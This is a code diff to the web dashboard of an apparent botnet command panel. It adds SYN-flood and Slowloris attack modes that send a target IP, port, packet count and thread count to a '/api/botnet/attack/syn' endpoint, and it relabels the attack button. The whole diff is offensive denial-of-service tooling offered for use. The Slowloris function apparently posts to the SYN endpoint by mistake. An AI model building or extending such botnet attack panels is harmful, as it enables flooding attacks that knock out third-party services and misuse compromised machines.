@@ -29,6 +29,14 @@ content%}
 		<input
 			style="width: 200px !important"
 			type="text"
+			class="ip-display hidden"
+			style="font-size: medium"
+			id="socket"
+			placeholder="Socket used"
+		/>
+		<input
+			style="width: 200px !important"
+			type="text"
 			class="ip-display"
 			style="font-size: medium"
 			id="packet"
@@ -38,7 +46,7 @@ content%}
 			class="attack-button"
 			id="attack"
 		>
-			<div class="text">Ausführung</div>
+			<div class="text">Serang Bang</div>
 		</div>
 	</div>
 	<hr />
@@ -111,7 +119,6 @@ content%}
 				});
 			}
 		};
-
 		$.ajax({
 			type: "POST",
 			url: "/api/botnet/get",
@@ -148,7 +155,7 @@ content%}
 			refreshBot(e);
 		});
 
-		const atak = (type) => {
+		const atakSyn = (type) => {
 			const datip = $("#target-ip").val();
 			const port = datip.split(":")[1];
 			const ip = datip.split(":")[0];
@@ -163,16 +170,95 @@ content%}
 					t_thread: $("#thread").val(),
 				},
 				success: (res) => {
+					Toastify({
+						text: `Attack Success, with ${res.data.length} botnet not attacking`,
+						duration: 3000,
+						gravity: "top",
+						position: "right",
+						stopOnFocus: true,
+						style: {
+							background:
+								"linear-gradient(90deg, rgba(43,29,253,1) 0%, rgba(228,69,252,1) 100%)",
+						},
+					}).showToast();
 					console.log(res);
 				},
 				error: (res) => {
+					Toastify({
+						text: `an error occurred`,
+						duration: 3000,
+						gravity: "top",
+						position: "right",
+						stopOnFocus: true,
+						style: {
+							background:
+								"linear-gradient(90deg, rgba(253,29,29,1) 0%, rgba(252,176,69,1) 100%)",
+						},
+					}).showToast();
+					console.log(res);
+				},
+			});
+		};
+		const atakLor = (type) => {
+			const datip = $("#target-ip").val();
+			const port = datip.split(":")[1];
+			const ip = datip.split(":")[0];
+			console.log(datip);
+			$.ajax({
+				type: "POST",
+				url: "/api/botnet/attack/syn",
+				data: {
+					t_ip: ip,
+					t_port: port,
+					t_packet: $("#packet").val(),
+					t_thread: $("#thread").val(),
+				},
+				success: (res) => {
+					Toastify({
+						text: `Attack Success, with ${res.data.length} botnet not attacking`,
+						duration: 3000,
+						gravity: "top",
+						position: "right",
+						stopOnFocus: true,
+						style: {
+							background:
+								"linear-gradient(90deg, rgba(43,29,253,1) 0%, rgba(228,69,252,1) 100%)",
+						},
+					}).showToast();
+					console.log(res);
+				},
+				error: (res) => {
+					Toastify({
+						text: `an error occurred`,
+						duration: 3000,
+						gravity: "top",
+						position: "right",
+						stopOnFocus: true,
+						style: {
+							background:
+								"linear-gradient(90deg, rgba(253,29,29,1) 0%, rgba(252,176,69,1) 100%)",
+						},
+					}).showToast();
 					console.log(res);
 				},
 			});
 		};
 
 		$("#attack").on("click", () => {
-			atak();
+			if ($("#mode").val() == "syn") {
+				atakSyn();
+			} else if ($("#mode").val() == "lor") {
+				atakLor();
+			}
+		});
+		$("#mode").on("change", () => {
+			if ($("#mode").val() == "syn") {
+				$("#thread").removeClass("hidden");
+				$("#socket").addClass("hidden");
+			} else if ($("#mode").val() == "lor") {
+				$("#thread").addClass("hidden");
+				$("#socket").removeClass("hidden");
+			}
 		});
 	});
 </script>
